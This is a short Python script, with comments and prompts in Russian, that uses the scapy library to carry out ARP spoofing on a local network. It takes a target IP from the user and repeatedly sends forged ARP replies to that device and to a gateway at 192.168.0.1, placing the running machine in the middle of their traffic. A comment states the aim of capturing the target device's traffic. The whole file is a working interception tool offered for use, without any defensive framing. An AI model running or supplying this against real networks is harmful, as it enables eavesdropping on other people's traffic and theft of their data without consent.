from scapy.all import ARP, Ether, sendp, getmacbyip
import time
import sys
ip = input("Введите IP: ")

def arp_spoof(target_ip, gateway_ip, iface):
    try:
        # Получаем MAC-адреса
        target_mac = getmacbyip(target_ip)
        gateway_mac = getmacbyip(gateway_ip)

        if not target_mac or not gateway_mac:
            print(f"Не удалось получить MAC для {target_ip} или {gateway_ip}")
            return

        # Создаем ARP-пакеты
        arp_response = Ether(dst=target_mac) / ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=target_mac)
        arp_response2 = Ether(dst=gateway_mac) / ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst=gateway_mac)

        print(f"Начинаем ARP-спуфинг: {target_ip} <-> {gateway_ip} (Ctrl+C для остановки)")
        while True:
            sendp(arp_response, iface=iface, verbose=False)
            sendp(arp_response2, iface=iface, verbose=False)
            time.sleep(2)
    except KeyboardInterrupt:
        print("Останавливаем ARP-спуфинг...")
    except Exception as e:
        print(f"Ошибка: {e}")


if __name__ == "__main__":
    # Укажите параметры
    target_ip =ip  # IP устройства, чей трафик вы хотите захватить
    gateway_ip = "192.168.0.1"  # IP шлюза (роутера)
    iface = None  # Ваш интерфейс (замените на правильный)

    arp_spoof(target_ip, gateway_ip, iface)
